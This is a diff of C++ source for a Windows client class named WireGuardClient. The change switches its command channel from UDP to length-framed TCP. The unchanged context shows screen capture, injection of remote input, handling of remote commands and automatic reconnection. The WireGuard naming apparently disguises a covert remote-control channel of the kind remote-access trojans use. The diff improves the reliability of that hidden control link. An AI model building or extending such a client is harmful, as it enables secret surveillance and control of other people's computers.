@@ -8,6 +8,7 @@
 #include <algorithm>
 #include <fstream>
 #include <memory>
+#include <cstdint>
 
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
@@ -363,42 +364,56 @@ private:
     std::string session_id;
     std::random_device rd;
     std::mt19937 gen;
-    SOCKET udp_socket;
+    SOCKET tcp_socket;
     
     WireGuardCapture screen_capture;
     WireGuardInput input_handler;
     std::vector<BYTE> last_frame_data;
     
-    bool sendWireGuardPacket(const WireGuardPacket& packet) {
-        if (udp_socket == INVALID_SOCKET) return false;
-        
-        sockaddr_in server_addr;
-        server_addr.sin_family = AF_INET;
-        server_addr.sin_port = htons(server_port);
-        inet_pton(AF_INET, server_host.c_str(), &server_addr.sin_addr);
-        
-        std::vector<BYTE> packet_data = packet.serialize();
-        
-        int result = sendto(udp_socket, (const char*)packet_data.data(), packet_data.size(), 0,
-                           (sockaddr*)&server_addr, sizeof(server_addr));
-        
-        return result != SOCKET_ERROR;
-    }
-    
-    WireGuardPacket receiveWireGuardPacket() {
-        char buffer[4096];
-        sockaddr_in from_addr;
-        int from_len = sizeof(from_addr);
-        
-        int bytes_received = recvfrom(udp_socket, buffer, sizeof(buffer), 0,
-                                     (sockaddr*)&from_addr, &from_len);
-        
-        if (bytes_received > 0) {
-            std::vector<BYTE> data(buffer, buffer + bytes_received);
-            return WireGuardPacket::deserialize(data);
+    static bool sendAll(SOCKET s, const char* data, int len) {
+        int sent = 0;
+        while (sent < len) {
+            int ret = send(s, data + sent, len - sent, 0);
+            if (ret == SOCKET_ERROR) return false;
+            sent += ret;
         }
-        
-        return WireGuardPacket({});
+        return true;
+    }
+
+    static bool recvAll(SOCKET s, char* data, int len) {
+        int received = 0;
+        while (received < len) {
+            int ret = recv(s, data + received, len - received, 0);
+            if (ret <= 0) return false;
+            received += ret;
+        }
+        return true;
+    }
+
+    bool sendWireGuardPacket(const WireGuardPacket& packet) {
+        if (tcp_socket == INVALID_SOCKET) return false;
+
+        std::vector<BYTE> packet_data = packet.serialize();
+        uint32_t len = htonl(static_cast<uint32_t>(packet_data.size()));
+
+        if (!sendAll(tcp_socket, reinterpret_cast<const char*>(&len), sizeof(len))) return false;
+        return sendAll(tcp_socket, reinterpret_cast<const char*>(packet_data.data()), packet_data.size());
+    }
+
+    WireGuardPacket receiveWireGuardPacket() {
+        uint32_t len = 0;
+        if (!recvAll(tcp_socket, reinterpret_cast<char*>(&len), sizeof(len))) {
+            return WireGuardPacket({});
+        }
+        len = ntohl(len);
+        if (len == 0 || len > 10 * 1024 * 1024) {
+            return WireGuardPacket({});
+        }
+        std::vector<BYTE> data(len);
+        if (!recvAll(tcp_socket, reinterpret_cast<char*>(data.data()), len)) {
+            return WireGuardPacket({});
+        }
+        return WireGuardPacket::deserialize(data);
     }
     
     void processRemoteCommand(const std::string& commandData) {
@@ -428,43 +443,52 @@ private:
     }
 
 public:
-    WireGuardClient(const std::string& host, int port) 
-        : server_host(host), server_port(port), gen(rd()), udp_socket(INVALID_SOCKET) {}
-    
+    WireGuardClient(const std::string& host, int port)
+        : server_host(host), server_port(port), gen(rd()), tcp_socket(INVALID_SOCKET) {}
+
     bool initializeConnection() {
-        udp_socket = socket(AF_INET, SOCK_DGRAM, 0);
-        if (udp_socket == INVALID_SOCKET) return false;
-        
+        tcp_socket = socket(AF_INET, SOCK_STREAM, 0);
+        if (tcp_socket == INVALID_SOCKET) return false;
+
+        sockaddr_in server_addr{};
+        server_addr.sin_family = AF_INET;
+        server_addr.sin_port = htons(server_port);
+        inet_pton(AF_INET, server_host.c_str(), &server_addr.sin_addr);
+
+        if (connect(tcp_socket, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
+            return false;
+        }
+
         DWORD timeout = 1000;
-        setsockopt(udp_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
-        
+        setsockopt(tcp_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
+
         std::vector<BYTE> handshake_payload = TunnelProtocol::createTunnelPayload("handshake", "initiation");
         WireGuardPacket handshake(handshake_payload);
-        
+
         if (!sendWireGuardPacket(handshake)) return false;
-        
+
         WireGuardPacket response = receiveWireGuardPacket();
         auto [type, data] = TunnelProtocol::extractTunnelPayload(response.encrypted_payload);
-        
+
         if (type == "session") {
             session_id = data;
             return true;
         }
-        
+
         return false;
     }
     
     void checkForCommands() {
         fd_set readfds;
         FD_ZERO(&readfds);
-        FD_SET(udp_socket, &readfds);
+        FD_SET(tcp_socket, &readfds);
         
         timeval timeout;
         timeout.tv_sec = 0;
         timeout.tv_usec = 1000;
         
         if (select(0, &readfds, nullptr, nullptr, &timeout) > 0) {
-            WireGuardPacket packet = receiveWireGuardPacket();
+                WireGuardPacket packet = receiveWireGuardPacket();
             auto [type, data] = TunnelProtocol::extractTunnelPayload(packet.encrypted_payload);
             
             if (type == "input" && !data.empty()) {
@@ -539,9 +563,9 @@ public:
                     }
                 }
                 
-                if (udp_socket != INVALID_SOCKET) {
-                    closesocket(udp_socket);
-                    udp_socket = INVALID_SOCKET;
+                if (tcp_socket != INVALID_SOCKET) {
+                    closesocket(tcp_socket);
+                    tcp_socket = INVALID_SOCKET;
                 }
                 
                 std::this_thread::sleep_for(std::chrono::seconds(30));
@@ -553,8 +577,8 @@ public:
     }
     
     ~WireGuardClient() {
-        if (udp_socket != INVALID_SOCKET) {
-            closesocket(udp_socket);
+        if (tcp_socket != INVALID_SOCKET) {
+            closesocket(tcp_socket);
         }
     }
 };
